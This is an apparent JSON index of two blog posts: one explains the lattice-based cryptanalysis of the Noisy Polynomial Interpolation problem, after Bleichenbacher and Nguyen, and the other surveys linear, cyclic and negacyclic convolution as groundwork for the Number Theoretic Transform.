[{"categories":[],"content":" Note:Noisy Polynomial Interpolation Problem Polynomial Interpolation Problem and Lattice ","date":"2025-08-27","objectID":"/nip/:0:0","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"1. Understanding the NPI Problem The Noisy Polynomial Interpolation (NPI) problem is a computational challenge that was once believed to be hard, forming the security basis for several cryptographic protocols. This analysis explores its definition, its origins, and why it turned out to be much weaker than anticipated.1 ","date":"2025-08-27","objectID":"/nip/:1:0","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"1.1 A Formal Definition Let’s start with a formal definition. Imagine we have a polynomial $P(X)$ of degree $k$ over a finite field $F$. Quick Note: A finite field $F$ is just a set of numbers with a finite number of elements, where you can perform addition, subtraction, multiplication, and division, and the result stays within the set. A common example is the set of integers modulo a prime number. The input to the NPI problem consists of: $n$ distinct points from the field $F$, which we’ll call $x_1, x_2, \\dots, x_n$. $n$ corresponding sets, $S_1, S_2, \\dots, S_n$. Each set $S_i$ contains $m$ elements. One of these elements is the true value of the polynomial at that point, $P(x_i)$, while the other $m-1$ elements are random “noise” values from the field. In other words, for every $i$, we know that $P(x_i) \\in S_i$, but we don’t know which one it is. The Goal: Given the points $x_i$ and the sets of candidates $S_i$, the challenge is to recover the original secret polynomial $P(X)$. For the problem to have a unique solution, the parameters must satisfy a certain condition. There are $m^n$ possible combinations of points to form a polynomial. To ensure that only the correct combination results in a polynomial of degree $k$, we need a heuristic condition: $$ m^n \\ll |F|^{n-(k+1)} $$This intuitively means that if the noise level ($m$) is low enough or the field ($F$) is large enough, a random combination of points is highly unlikely to form a low-degree polynomial, making the true solution stand out. ","date":"2025-08-27","objectID":"/nip/:1:1","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"1.2 Cryptographic Origins The NPI problem wasn’t just an abstract mathematical puzzle. It was introduced by Naor and Pinkas in their pioneering work on Oblivious Polynomial Evaluation (OPE). In an OPE protocol, a server holds a secret polynomial $P(X)$ and a client holds a secret input $\\alpha$. The goal is to allow the client to learn $P(\\alpha)$ without revealing $\\alpha$ to the server, and without the client learning anything more about $P(X)$ than the result $P(\\alpha)$. The security of the client’s input in this protocol relied directly on the presumed hardness of the NPI problem. ","date":"2025-08-27","objectID":"/nip/:1:2","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"1.3 A Related Problem: Polynomial Reconstruction To understand NPI’s complexity, it’s useful to compare it to a well-studied problem called Polynomial Reconstruction (PR), also known in coding theory as the list-decoding problem for Reed-Solomon codes. PR Problem: Given $n$ points $(x_1, y_1), \\dots, (x_n, y_n)$ and integers $k$ and $t$, find all polynomials $P(X)$ of degree at most $k$ that pass through at least $t$ of these points. There is a simple reduction from NPI to PR. By taking all $nm$ possible points $(x_i, y_{i,j})$ where $y_{i,j} \\in S_i$, we can frame the NPI problem as a PR instance where we are looking for a polynomial of degree $k$ that passes through exactly $t=n$ of these points. The best algorithms for PR, like the Guruswami-Sudan (GS) algorithm, can solve this if $n \u003e \\sqrt{k(nm)}$, which simplifies to $m \u003c n/k$. This reduction led to the initial belief that NPI was as hard as PR. However, this turned out to be a flawed assumption. A reduction only proves that NPI is no harder than PR, not that it is equally hard. The PR instances generated from NPI have a special structure that, as we will see, makes them much easier to solve. ","date":"2025-08-27","objectID":"/nip/:1:3","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"2. Traditional Attacks on NPI Before lattice-based methods shattered the NPI landscape, cryptanalysts relied on a few classical approaches. ","date":"2025-08-27","objectID":"/nip/:2:0","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"2.1 From Error Correction to List Decoding The most direct attack, as mentioned, is to reduce NPI to PR and use a list-decoding algorithm like Guruswami-Sudan (GS). This works, but only under the condition that $m \u003c n/k$. This provides a clear benchmark for when NPI is weak: if the number of noisy candidates ($m$) is small relative to the ratio of points to degree ($n/k$), the problem is broken. However, for cryptographic applications with a larger $m$, this attack is ineffective. ","date":"2025-08-27","objectID":"/nip/:2:1","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"2.2 The Algebraic Approach: Gröbner Bases Another method is to translate NPI into a system of multivariate polynomial equations. We can express the unknown polynomial as $P(X) = \\sum_{i=0}^{k} a_i X^i$, where the coefficients $a_i$ are our variables. For each point $x_i$, the condition $P(x_i) \\in S_i$ can be written as a single equation: $$ \\prod_{j=1}^{m} (P(x_i) - y_{i,j}) = 0 $$This gives us a system of $n$ equations in $k+1$ variables ($a_0, \\dots, a_k$). Such systems can be solved using Gröbner basis algorithms. The fatal flaw of this approach is its complexity, which is typically super-exponential in the number of variables ($k$). For any cryptographically interesting parameters, this method is computationally infeasible. ","date":"2025-08-27","objectID":"/nip/:2:2","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"2.3 A Divide-and-Conquer Strategy: Meet-in-the-Middle The meet-in-the-middle attack is a classic divide-and-conquer algorithm that is far more efficient than brute force. Its core idea is to leverage the linearity of the Lagrange interpolation formula. Lagrange Interpolation: This is a method to find the unique polynomial of degree at most $n’-1$ that passes through a given set of $n’$ points. The formula is: $$ \u003e P(X) = \\sum_{i=1}^{n'} P(x_i) L_i(X) \\quad \\text{where} \\quad L_i(X) = \\prod_{j=1, j \\neq i}^{n'} \\frac{X - x_j}{x_i - x_j} \u003e $$ The attack works by splitting the sum into two halves. It generates a list of possible polynomial parts from the first half and another list from the second half. It then searches for a pair (one from each list) that, when added together, cancels out the high-degree terms, resulting in a polynomial of the correct low degree $k$. The complexity is roughly $O(m^{n’/2})$, a huge improvement over the $O(m^{n’})$ of brute force. However, it’s still exponential. More importantly, this attack was the first to exploit the unique structure of NPI—the fact that the evaluation points $x_i$ are fixed and known. This hinted that NPI’s structure was its Achilles’ heel. ","date":"2025-08-27","objectID":"/nip/:2:3","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"3. The Game Changer: Lattice-Based Cryptanalysis While traditional methods like algebraic solvers or meet-in-the-middle attacks showed limited success, the advent of lattice-based cryptanalysis completely changed the game. This powerful approach transforms the algebraic NPI problem into a geometric one. By representing potential solutions as vectors in a high-dimensional grid, or lattice, the problem becomes one of finding an unusually short vector in that grid—a task for which efficient algorithms exist. What is a Lattice? In simple terms, a lattice is a regular, repeating grid of points in a high-dimensional space. Think of the corners of a grid of cubes that extends infinitely in all directions. Lattice-based cryptanalysis often boils down to solving the Shortest Vector Problem (SVP): finding the non-zero point in this grid that is closest to the origin. While finding the absolute shortest vector is computationally hard, algorithms like LLL and BKZ are remarkably good at finding very short vectors, which is often enough to break a scheme. ","date":"2025-08-27","objectID":"/nip/:3:0","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"3.1 From Polynomials to Lattices: The Linearization Framework The first step is to linearize the NPI problem. The non-linearity comes from having to choose the correct $P(x_i)$ from each set $S_i$. We can represent this choice using integer indicator variables $\\delta_{i,j}$: $$ \\delta_{i,j} = \\begin{cases} 1 \u0026 \\text{if } P(x_i) = y_{i,j} \\\\\\\\ 0 \u0026 \\text{otherwise} \\end{cases} $$Using these variables, the Lagrange formula becomes a linear combination: $$ P(X) = \\sum_{i=1}^{n} \\sum_{j=1}^{m} \\delta_{i,j} y_{i,j} L_i(X) $$The core constraint of NPI is that $P(X)$ must have a degree at most $k$. This means the coefficients of all terms with a power higher than $k$ (i.e., $X^{k+1}, \\dots, X^{n-1}$) must be zero. This gives us a system of linear equations in the variables $\\delta_{i,j}$, which defines our lattice. Lemma 1. Let $A \\in M_{n,e}(\\mathbb{Z}_q)$. Then the volume of $L(A)\u003e $ divides $q^e$. It is exactly $q^e$ if and only if ${\\mathbf{x}A : \\mathbf{x} \\in \\mathbb{Z}_q^n}$ is entirely $\\mathbb{Z}_q^e$. Proof: By definition, $L(A)$ is the kernel of the group homomorphism $\\phi$ that maps any $\\mathbf{x} \\in \\mathbb{Z}^n$ to $(\\mathbf{x}A \\pmod q) \\in \\mathbb{Z}_q^e$. Therefore the group quotient $\\mathbb{Z}^n / L(A)$ is isomorphic to the image of $\\phi$. But since $L(A)$ is a full-dimensional lattice in $\\mathbb{Z}^n$, its volume is simply the index $[\\mathbb{Z}^n : L(A)]$ of $L(A)$ in $\\mathbb{Z}^n$, from which both statements follow. $\\square$ Letting $L_i(x) = \\sum_{w=0}^{n-1} \\ell_{i,w}x^w$, the lattice $L$ of Section 3.1 is equal to $L(A)$, where $\\mathbb{F} = \\mathbb{Z}_q$ and $A$ is the following matrix of dimension $nm \\times n-1-k$. $$ A = \\begin{pmatrix} \u003e y_{1,1} \\ell_{1, k+1} \u0026 \\cdots \u0026 y_{1,1} \\ell_{1, n-1} \\\\\\\\ \u003e \\vdots \u0026 \\ddots \u0026 \\vdots \\\\\\\\ \u003e y_{i,j} \\ell_{i, k+1} \u0026 \\cdots \u0026 y_{i,j} \\ell_{i, n-1} \\\\\\\\ \u003e \\vdots \u0026 \\ddots \u0026 \\vdots \\\\\\\\ \u003e y_{n,m} \\ell_{n, k+1} \u0026 \\cdots \u0026 y_{n,m} \\ell_{n, n-1} \u003e \\end{pmatrix} \u003e $$ ","date":"2025-08-27","objectID":"/nip/:3:1","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"3.2 The First Attempt: Defining a Lattice Let’s define a lattice $L$ as the set of all integer vectors $(d_{1,1}, \\dots, d_{n,m})$ that satisfy these degree constraints. The solution to our NPI problem corresponds to a specific vector $\\delta$ in this lattice. This target vector $\\delta$ has two special properties: All its entries are either 0 or 1. It contains exactly $n$ ones and the rest are zeros. From this, we can calculate its Euclidean length: $$ \\|\\delta\\| = \\sqrt{\\sum_{i,j} \\delta_{i,j}^2} = \\sqrt{n} $$In a space with $nm$ dimensions, a vector of length $\\sqrt{n}$ is exceptionally short. This is the central insight of the attack: if our target vector is the shortest non-zero vector in the lattice, we can find it using lattice reduction algorithms. Finding $\\delta$ is equivalent to solving the NPI problem. ","date":"2025-08-27","objectID":"/nip/:3:2","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"3.3 Why This Might Work: Short Vector Heuristics Heuristically, the shortest vector in a “random” lattice of this volume is expected to be much longer than $\\sqrt{n}$. This gives us good reason to hope that our target vector $\\delta$ is unique and findable. However, this relies on the assumption that our lattice is “random,” which it isn’t. Its structure is determined entirely by the NPI instance. ","date":"2025-08-27","objectID":"/nip/:3:3","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"3.4 A Crucial Refinement: A Better Lattice To move from a heuristic to a provable attack, a key refinement is needed. We have not yet used a crucial piece of information: for each $i$, exactly one of the $\\delta_{i,j}$ values (for $j=1, \\dots, m$) is 1. This means $\\sum_{j=1}^{m} \\delta_{i,j} = 1$ for all $i$. We can encode this powerful structural information by defining a new, smaller lattice (a sublattice), which we’ll call A. This lattice A contains only the vectors from our original lattice $L$ that also satisfy the property that the sum of entries for each block $i$ is equal. The target vector $\\delta$ is clearly in this sublattice A. This refinement is profound. By adding more constraints, we drastically shrink the search space and build a lattice that is no longer “random-like,” allowing for a rigorous analysis. ","date":"2025-08-27","objectID":"/nip/:3:4","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"3.5 From Heuristics to Proof: Reducing NPI to SVP With the refined lattice A, it’s possible to prove that, under certain conditions, NPI can be reduced to the Shortest Vector Problem (SVP). The analysis shows that if the problem parameters are chosen correctly, the expected number of “bad” vectors (short vectors in the lattice that are not our target solution) is less than 1. This implies that with high probability, the target vector $\\delta$ is the unique shortest non-zero vector in the lattice A. Therefore, an algorithm that can solve SVP (in practice, approximated by algorithms like LLL and BKZ) can solve the NPI problem. This constitutes a formal, probabilistic reduction from NPI to SVP. The attack works by encoding enough of the problem’s unique structure into the lattice to eliminate other “short” but incorrect vectors, allowing the true solution to be isolated. ","date":"2025-08-27","objectID":"/nip/:3:5","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"3.6 Putting Theory into Practice: Experimental Results The theoretical attack was backed by powerful experimental results. The researchers implemented the attack and tested it against NPI instances with cryptographically significant parameters. For an instance with $n=160, m=2$ over an 80-bit field: The GS algorithm attack works only for degree $k \\le 80$. The lattice attack was theoretically predicted to work for $k \\le 155$. In practice, the attack successfully solved instances with degrees up to $k=154$, running in just a few hours. This was a stunning result. The lattice attack was not just a theoretical curiosity; it was a practical tool that could break NPI instances with parameters far beyond the reach of any other known method. Table 1: Performance of the Refined Lattice Attack on NPI Instances n m $\\log_2(q)$ k (Theoretical Limit) k (Achieved in Practice) Algorithm Used Runtime 160 2 80 155 $\\le 152$ BKZ-20 \u003c 4 hours 160 2 80 155 154 BKZ-20 + Pruning 8 hours 115 3 80 110 101 BKZ-20 \u003c 1 day 105 4 80 100 80 BKZ-20 \u003c 1 day To put the theory to the test, I set up a specific NPI instance with $n=95, m=3$, and a polynomial degree of $k=76$. The underlying field was defined by a 40-bit prime modulus $( q \\approx 2^{40})$ I then ran the lattice attack using BKZ-20 to solve it.2 ","date":"2025-08-27","objectID":"/nip/:3:6","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"4. Re-evaluating NPI’s Security The discovery of this devastating attack had immediate and serious implications for any cryptographic protocol whose security relied on the NPI problem. ","date":"2025-08-27","objectID":"/nip/:4:0","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"4.1 The Fallen Hardness Assumption The core conclusion is undeniable: The NPI problem is far easier to solve than originally believed and is not a suitable foundation for cryptographic security. The attack fundamentally disproved the conjecture that NPI was as hard as the general Polynomial Reconstruction (PR) problem. The lattice attack is highly customized; it specifically exploits the unique structure of NPI, which is absent in the general PR problem. This makes NPI a demonstrably weaker problem. This serves as a crucial cautionary tale for cryptographers: simply reducing a new problem to a known hard problem is not enough to guarantee its security. The new problem’s specific structure might introduce vulnerabilities that can be exploited by powerful, specialized tools like lattice reduction. ","date":"2025-08-27","objectID":"/nip/:4:1","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"4.2 Recommendations for Secure Protocols For protocols built on NPI, modifications are essential to restore security. Two primary recommendations emerged: Switch to a Stronger Foundation (PR): Since PR is still considered hard, protocols can be modified to rely on it instead. For example, instead of having a fixed set of evaluation points $x_i$, the protocol could be changed so the points are not structured in a way that allows the NPI attack. Change the Algebraic Setting (DLP): Another effective defense is to move the protocol into an algebraic group where the Discrete Logarithm Problem (DLP) is hard. Instead of exchanging values $y_{i,j}$ directly, participants would exchange $g^{y_{i,j}}$, where $g$ is a generator of the group. The lattice attack relies on linear relationships between the $y_{i,j}$ values. Hiding them with a one-way function $x \\mapsto g^x$ conceals these relationships, thwarting the attack. ","date":"2025-08-27","objectID":"/nip/:4:2","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"5. A Number Theory Analogy: The NCR Problem There is a beautiful analogy between algebra and number theory, and the NPI problem has a direct counterpart called the Noisy Chinese Remaindering (NCR) problem. ","date":"2025-08-27","objectID":"/nip/:5:0","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"5.1 Definition and Applications The setup is similar: given an unknown integer $N$ and a set of moduli $p_1, \\dots, p_n$, we are given for each modulus a small set of candidates $S_i$ that contains the true remainder $N \\pmod{p_i}$. The goal is to find $N$. This problem appears in applications like counting points on elliptic curves. ","date":"2025-08-27","objectID":"/nip/:5:1","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"5.2 Solving the NCR Problem Methods for solving NCR are strikingly similar to those for NPI, including a powerful lattice-based technique known as the Coppersmith method. This leads to a natural question: can our direct lattice attack on NPI also break NCR? ","date":"2025-08-27","objectID":"/nip/:5:2","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"5.3 Why Lattice Attacks Fail Against NCR The answer, surprisingly, is no. While one can construct a similar lattice for the NCR problem, it typically fails in practice. The reason lies in the arithmetic structure of the problem. When the NCR instance involves many small moduli (which is common in its applications), it’s very likely that short linear dependencies exist among the candidate remainders (e.g., $r_{i,1} + r_{i,2} - r_{i,3} \\equiv 0 \\pmod{p_i}$). Each of these dependencies creates an unrelated, “parasitic” short vector in the lattice. These parasitic vectors effectively flood the lattice with noise, making it impossible for lattice reduction algorithms to isolate the true target vector. In essence, the number-theoretic structure of NCR creates too many false signals in the lattice, hiding the very solution the attack needs to find. This highlights a deep condition for a successful lattice attack: not only do you need a short target vector, but the lattice itself must be “well-behaved” and not full of other short vectors arising from its own internal structure. ","date":"2025-08-27","objectID":"/nip/:5:3","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":"6. Conclusion and Future Work This analysis tells the story of a cryptographic problem that went from a promising hardness assumption to being completely broken by a highly effective, specialized attack. The NPI problem is far weaker than anticipated due to its unique algebraic structure, which makes it fatally vulnerable to lattice cryptanalysis. This serves as a critical lesson in protocol design: a problem’s specific structure must be scrutinized against the most powerful analytical tools available. For NPI, this structure was not a feature but a bug. Any protocols still relying on it must be updated. The contrast with the NCR problem further deepens our understanding, showing that the success of a lattice attack depends heavily on the underlying “geometric quality” of the lattice, which is dictated by the problem’s algebraic or number-theoretic properties. This continues to be a rich area of research, pushing the boundaries of what is possible in the world of lattice-based cryptanalysis. Reference: Bleichenbacher, D., \u0026 Nguyen, P. Q. (2000). Noisy Polynomial Interpolation and Noisy Chinese Remaindering. In International Conference on the Theory and Application of Cryptographic Techniques (EUROCRYPT 2000). Springer. ↩︎ Experimental Code ↩︎ ","date":"2025-08-27","objectID":"/nip/:6:0","tags":[],"title":"NIP","uri":"/nip/"},{"categories":[],"content":" Survey:NTT,as it was. First Principles From First Principles to Post-Quantum Cryptography: A Comprehensive Analysis of Convolution and the Number Theoretic Transform ","date":"2025-08-09","objectID":"/waytontt-part-0/:0:0","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"Introduction At the heart of numerous scientific and technological domains lies a fundamental, yet computationally demanding, operation: the multiplication of polynomials. From the filtering of signals in digital communication systems and the processing of images in medical diagnostics to the abstract manipulations of computer algebra and the security foundations of modern cryptography, the ability to efficiently compute the product of two polynomials is of paramount importance. The direct, “schoolbook” method for this task, while conceptually simple, carries a quadratic computational complexity of $O(n^2)$, rendering it impractical for the large-degree polynomials frequently encountered in advanced applications. This computational bottleneck has motivated centuries of mathematical and algorithmic innovation. The algebraic core of polynomial multiplication is an operation known as convolution. Formally, the sequence of coefficients of a product polynomial is the linear convolution of the coefficient sequences of the original polynomials. This equivalence establishes a central theme: to multiply polynomials efficiently, one must compute convolutions efficiently. For decades, the primary tool for this task has been the Fast Fourier Transform (FFT), an algorithm that dramatically reduces the complexity of convolution to a quasi-linear $O(n\\log n)$. However, the FFT and its underlying Discrete Fourier Transform (DFT) operate over the field of complex numbers. When implemented on digital computers, this reliance on floating-point arithmetic introduces inevitable precision and rounding errors. While acceptable in many signal processing applications where some degree of noise is tolerable, such errors are catastrophic in domains like cryptography and large-integer arithmetic, where computations must be exact. This report provides a detailed exposition of the Number Theoretic Transform (NTT), a powerful analogue of the DFT that resolves the precision dilemma. By operating entirely within finite fields of integers, the NTT provides a mechanism for performing convolutions with the quasi-linear time complexity of the FFT but with perfect, error-free precision. This unique combination of speed and exactness has made the NTT an indispensable tool, particularly in the burgeoning field of post-quantum cryptography (PQC). As the world prepares for the security challenges posed by quantum computers, lattice-based cryptographic schemes have emerged as a leading solution, and the NTT is the algorithmic engine that makes their performance practical. The following analysis will provide a comprehensive and pedagogically structured journey into this critical subject. The report begins by meticulously defining and differentiating the three primary forms of convolution—linear, cyclic, and negacyclic—and establishing their profound connection to polynomial multiplication in distinct algebraic rings. It then develops the complete mathematical theory of the NTT from first principles, including the crucial role of primitive roots of unity and a rigorous proof of the convolution theorem in finite fields. Subsequently, the report delves into the algorithmic intricacies of fast transforms, such as the Cooley-Tukey algorithm, butterfly operations, and bit-reversal, culminating in a detailed numerical example. Finally, it illuminates the specialized techniques required to adapt the NTT for negacyclic convolution and analyzes its critical role in securing the next generation of public-key cryptography, with a specific focus on the NIST-standardized schemes CRYSTALS-Kyber and CRYSTALS-Dilithium. ","date":"2025-08-09","objectID":"/waytontt-part-0/:1:0","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"The Three Convolutions: A Mathematical Framework The term “convolution” is not monolithic; it describes a family of related mathematical operations, each with distinct properties and algebraic interpretations. Understanding the differences between linear, cyclic, and negacyclic convolution is fundamental to grasping their applications in signal processing, abstract algebra, and cryptography. The choice of convolution is, in essence, the choice of an algebraic world. The transition between these types is not merely an algorithmic adjustment but a fundamental shift in the underlying mathematical structure where the computation is defined. ","date":"2025-08-09","objectID":"/waytontt-part-0/:2:0","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"Linear Convolution: The Foundation of Signal Processing and Polynomial Products Linear convolution is the most fundamental of the three types and corresponds to the intuitive notion of polynomial multiplication and the behavior of many physical systems. Formal Definition In the context of discrete sequences, the linear convolution of two sequences, $g$ and $h$, is a third sequence, $y$, denoted as $y = g * h$. The $k$-th element of the output sequence is defined by the summation: $$y[k] = (g * h)[k] = \\sum_{i=-\\infty}^{\\infty} g[i]h[k-i]$$This operation describes how the shape of one sequence or function modifies the shape of another. In the domain of digital signal processing, this formula is the cornerstone of Linear Time-Invariant (LTI) system theory, where it calculates the system’s output $y[k]$ given an input signal $x[k]$ and the system’s impulse response $h[k]$. Equivalence to Polynomial Multiplication The most direct algebraic interpretation of linear convolution is standard polynomial multiplication. If we have two polynomials, $P(x)$ and $Q(x)$, with coefficient vectors $p = [p_0, p_1, \\ldots, p_{L-1}]$ and $q = [q_0, q_1, \\ldots, q_{M-1}]$ respectively: $$P(x) = \\sum_{i=0}^{L-1} p_i x^i$$ and $$Q(x) = \\sum_{j=0}^{M-1} q_j x^j$$Their product, $C(x) = P(x) \\cdot Q(x)$, is a new polynomial whose coefficients, $c_k$, are given by: $$c_k = \\sum_{i+j=k} p_i q_j$$By substituting $j = k - i$, this becomes $c_k = \\sum_i p_i q_{k-i}$, which is precisely the definition of the linear convolution of the coefficient vectors $p$ and $q$. Thus, computing a linear convolution is algebraically equivalent to multiplying two polynomials in the ring of polynomials with integer or real coefficients, $\\mathbb{Z}[x]$ or $\\mathbb{R}[x]$. Output Length A defining characteristic of linear convolution is that the output sequence is longer than the input sequences. If the input polynomials have degrees $L-1$ and $M-1$ (corresponding to $L$ and $M$ coefficients), their product will have a degree of $(L-1) + (M-1) = L + M - 2$. This means the resulting coefficient vector will have a length of $L + M - 1$. This expansion of the output is a natural consequence of the multiplication; for example, the product of two degree-3 polynomials is a degree-6 polynomial. Matrix Representation Linear convolution can also be visualized as a matrix-vector multiplication. The operation can be structured by forming a Toeplitz matrix from one of the input vectors. A Toeplitz matrix has constant values along its diagonals, which elegantly captures the “shift-and-multiply” nature of convolution. For an input sequence $h$ of length $M$ and an input sequence $x$ of length $L$, the convolution $y = h * x$ can be written as: $\\begin{bmatrix} y_0 \\\\ y_1 \\\\ \\vdots \\\\ y_{L+M-2} \\end{bmatrix} = \\begin{bmatrix} h_0 \u0026 0 \u0026 \\cdots \u0026 0 \\\\ h_1 \u0026 h_0 \u0026 \\cdots \u0026 0 \\\\ \\vdots \u0026 h_1 \u0026 \\ddots \u0026 \\vdots \\\\ h_{M-1} \u0026 \\vdots \u0026 \\ddots \u0026 h_0 \\\\ 0 \u0026 h_{M-1} \u0026 \\cdots \u0026 h_1 \\\\ \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\ 0 \u0026 0 \u0026 \\cdots \u0026 h_{M-1} \\end{bmatrix} \\begin{bmatrix} x_0 \\\\ x_1 \\\\ \\vdots \\\\ x_{L-1} \\end{bmatrix}$ This matrix representation explicitly shows the shift-invariant property of the operation and is useful for both theoretical analysis and certain computational approaches. ","date":"2025-08-09","objectID":"/waytontt-part-0/:2:1","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"Cyclic Convolution: Introducing Periodicity and Quotient Rings While linear convolution is fundamental, many efficient algorithms, such as the FFT and NTT, are naturally suited to a periodic version of the operation known as cyclic or circular convolution. The “Wrap-Around” Concept The core idea of cyclic convolution is to treat the sequences as if they are inscribed on a circle. When an index goes past the end of the sequence, it “wraps around” to the beginning. This creates a periodic structure where the output sequence has the same length as the input sequences, unlike the expansion seen in linear convolution. Formal Definition For two sequences, $x$ and $h$, both of length $N$, their $N$-point cyclic convolution, denoted $y = x \\circledast h$, is defined as: $y[m] = \\sum_{n=0}^{N-1} x[n]h((m-n) \\bmod N)$ The modulo operator on the index of $h$ is what mathematically enforces the wrap-around behavior. The resulting sequence $y$ also has length $N$. Algebraic Isomorphism The shift from linear to cyclic convolution represents a profound change in the underlying algebraic setting. $N$-point cyclic convolution is directly isomorphic to polynomial multiplication within a specific algebraic structure known as a quotient ring. Specifically, it corresponds to multiplication in the ring $\\mathbb{Z}_q[x]/(x^N - 1)$. To understand this connection, consider the polynomial modulus $\\phi(x) = x^N - 1$. In this ring, any two polynomials are considered equivalent if their difference is a multiple of $x^N - 1$. This implies the relation $x^N \\equiv 1 \\pmod{x^N - 1}$. When we multiply two polynomials $P(x)$ and $Q(x)$ and reduce the result modulo $x^N - 1$, any term with a power of $x$ greater than or equal to $N$ is affected. For instance, a term $c_N x^N$ becomes $c_N$, and a term $c_{N+1} x^{N+1} = c_{N+1} x \\cdot x^N$ becomes $c_{N+1} x$. The coefficient of a higher-degree term effectively “wraps around” and is added to the coefficient of the corresponding lower-degree term. This additive wrap-around is precisely the behavior of cyclic convolution. ","date":"2025-08-09","objectID":"/waytontt-part-0/:2:2","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"Negacyclic Convolution: The Skewed Variant for Modern Cryptography A third, more specialized type of convolution has become critically important in modern cryptography: negacyclic convolution. It is also referred to as skew-circular or negative wrapped convolution. The Negated “Wrap-Around” Negacyclic convolution is similar to its cyclic counterpart but with a crucial twist: when an index wraps around, a sign change is introduced. This “skewed” periodicity is fundamental to the security properties of many lattice-based cryptosystems. Formal Definition For two sequences, $f$ and $g$, of length $N$, their negacyclic convolution, which we can denote as $f \\circledast_{-} g$, is defined by the formula: $$(f \\circledast_{-} g)\\_k := \\sum_{j=0}^{N-1} f_j g_{(k-j) \\bmod N} \\cdot (-1)^{\\lfloor (k-j) \u003c 0 \\rfloor}$$where the term $(-1)^{\\lfloor (k-j) \u003c 0 \\rfloor}$ introduces a sign flip for indices that wrap around (i.e., when $k - j \u003c 0$). The resulting sequence also has length $N$. Algebraic Isomorphism Just as cyclic convolution corresponds to the ring $\\mathbb{Z}_q[x]/(x^N - 1)$, negacyclic convolution is isomorphic to polynomial multiplication in the quotient ring $\\mathbb{Z}_q[x]/(x^N + 1)$. This ring is a specific type of cyclotomic ring that is central to the security of the Ring-Learning With Errors (RLWE) problem. The defining relation in this ring is $x^N \\equiv -1 \\pmod{x^N + 1}$. When a product polynomial is reduced modulo $x^N + 1$, a term like $c_N x^N$ becomes $-c_N$, and a term $c_{N+1} x^{N+1} = c_{N+1} x \\cdot x^N$ becomes $-c_{N+1} x$. In this case, the coefficient of a higher-degree term “wraps around” and is subtracted from the coefficient of the corresponding lower-degree term. This subtractive wrap-around gives the convolution its “negacyclic” character. ","date":"2025-08-09","objectID":"/waytontt-part-0/:2:3","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"Comparative Analysis and Numerical Examples To solidify the distinctions, consider the multiplication of two simple polynomials, $a(x) = 2x + 1$ and $b(x) = 4x + 3$. Their coefficient vectors (for degree 1, length $N = 2$) are $a = [1, 2]$ and $b = [3, 4]$. Linear Convolution This is standard polynomial multiplication: $$C(x) = (2x + 1)(4x + 3) = 8x^2 + 6x + 4x + 3 = 8x^2 + 10x + 3$$The resulting coefficient vector is $c = [3, 10, 8]$. The length is $2 + 2 - 1 = 3$. Cyclic Convolution (N=2) This corresponds to multiplication in a ring modulo $x^2 - 1$. We take the linear result and reduce it: $$C(x) \\pmod{x^2 - 1} = (8x^2 + 10x + 3) \\pmod{x^2 - 1}$$Since $x^2 \\equiv 1 \\pmod{x^2 - 1}$, we substitute: $$8(1) + 10x + 3 = 10x + 11$$The resulting coefficient vector is $c = [11, 10]$. The wrap-around added the coefficient of $x^2$ (which is 8) to the constant term (which was 3). Negacyclic Convolution (N=2) This corresponds to multiplication in a ring modulo $x^2 + 1$. We again reduce the linear result: $C(x) \\pmod{x^2 + 1} = (8x^2 + 10x + 3) \\pmod{x^2 + 1}$ Since $x^2 \\equiv -1 \\pmod{x^2 + 1}$, we substitute: $$8(-1) + 10x + 3 = 10x - 5$$The resulting coefficient vector is $c = [-5, 10]$. The wrap-around subtracted the coefficient of $x^2$ from the constant term. This simple example starkly illustrates how the choice of convolution—or equivalently, the choice of the underlying polynomial ring—fundamentally changes the outcome of the computation. ","date":"2025-08-09","objectID":"/waytontt-part-0/:2:4","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"Summary Table Feature Linear Convolution Cyclic Convolution Negacyclic Convolution Mathematical Formula $y[k] = \\sum_i g[i]h[k-i]$ $y[m] = \\sum_{n=0}^{N-1} x[n]h((m-n) \\bmod N)$ $y_k = \\sum_{j=0}^{N-1} f_j g_{(k-j) \\bmod N} \\cdot (-1)^{\\lfloor (k-j) \u003c 0 \\rfloor}$ Associated Polynomial Ring $\\mathbb{Z}[x]$ $\\mathbb{Z}_q[x]/(x^N - 1)$ $\\mathbb{Z}_q[x]/(x^N + 1)$ Output Length (for length-N inputs) $2N - 1$ $N$ $N$ “Wrap-around” Behavior None (expansion) $c_k \\leftarrow c_k + c_{k+N}$ $c_k \\leftarrow c_k - c_{k+N}$ Primary Application Domain General Signal Processing DFT/NTT-based Filtering Lattice-Based Cryptography 